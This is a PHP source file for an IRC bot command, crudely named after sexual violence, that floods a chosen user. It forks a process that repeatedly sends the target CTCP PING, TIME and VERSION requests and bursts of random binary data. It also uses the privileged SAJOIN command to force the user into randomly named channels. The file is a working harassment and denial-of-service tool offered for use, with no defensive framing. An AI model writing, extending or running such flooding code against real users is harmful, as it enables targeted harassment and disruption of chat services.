<?php

namespace Command;

class Rape extends \Classes\Command\Base
{
	protected $help = 'Make the bot rape a user with floods.';

	protected $usage = 'rape [username] [cycles]';
	
	protected $verify = true;
	
	protected $numberOfArguments = -1;
	
	public function command()
	{
		if(!strlen($this->arguments[0]))
		{
			$this->say($this->usage);
			return;
		}
		
		if(!strlen($this->arguments[1]))
		{
			$this->arguments[1] = 10;
		}
		
		$pid = pcntl_fork();
		if(!$pid)
		{
			for($i = 1; $i <= (int)$this->arguments[1]; $i++)
			{
				$dh = fopen('/dev/urandom', 'r');
				$data = fread($dh, 512);
				fclose($dh);
				$data = str_replace("\0", '', $data);
				$data = str_replace("\n", '', $data);
				$data = str_replace("\r", '', $data);
				$this->connection->sendData('PRIVMSG ' . $this->arguments[0] . ' :' . chr(1) . 'PING' . chr(1));
				$this->connection->sendData('PRIVMSG ' . $this->arguments[0] . ' :' . chr(1) . 'TIME' . chr(1));
				$this->connection->sendData('PRIVMSG ' . $this->arguments[0] . ' :' . chr(1) . 'VERSION' . chr(1));
				$this->connection->sendData('PRIVMSG ' . $this->arguments[0] . ' :' . $data);
				$data = '';
				$chan = '';
				$alpha = array_merge(range('a', 'z'), range('A', 'Z'));
				for($it = 1; $it <= 4; $it++)
				{
					$chan .= $alpha[rand(0,50)];
				}
				$this->connection->sendData(sprintf('SAJOIN %s #%s', $this->arguments[0], $chan));
			}
			return;
		}
	}
}
